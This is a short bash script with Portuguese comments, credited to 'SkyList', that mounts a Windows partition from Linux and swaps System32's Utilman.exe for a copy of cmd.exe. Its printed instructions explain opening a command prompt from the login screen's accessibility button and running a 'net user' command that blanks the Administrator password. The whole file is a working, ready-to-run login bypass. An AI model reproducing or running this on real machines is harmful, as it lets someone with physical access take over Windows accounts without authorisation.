#!/bin/bash
#Author: SkyList

echo "	#>PARA FUNCIONAR: TENHA A SENHA ROOT DO LINUX!!"
echo "		*>NÃO ESQUEÇA DE CHECAR QUAL A PARTIÇÃO NA QUAL OS ARQUIVOS DO WINDOWS SE ENCONTRAM"

#partição do HD onde os arquivos do windows se encontram
echo "partiçãao do windows: "
read particao_do_windows

#cria o diretorio que vai "segurar" a montagem
sudo mkdir /mnt/windows

#monta o a partição no diretorio criado anteriormente
sudo mount -t ntfs /dev/$particao_do_windows /mnt/windows -o "umask=022"

#vai ate o a pasta onde esta montado a partição do windows
cd /mnt/windows/Windows/System32

#troca o nome do arquivo de ajuda do Utilman por UtilmanOrig
sudo mv Utilman.exe UtilmanOrig.exe

#faz uma copia do CMD como Utilman
sudo cp cmd.exe Utilman.exe

echo "	#>QUANDO INICIAR O WINDOWS CLIQUE NO BOTÃO DE AJUDA DO CANTO INFERIOR DIREITO DA TELA DE LOGIN, IRA ABRIR O CMD"
echo "	#>USE O SEGUINTE COMANDO: net user Administrador "" "
echo "	#>PRONTO!! O ADMINISTRADOR ESTA SEM SENHA"
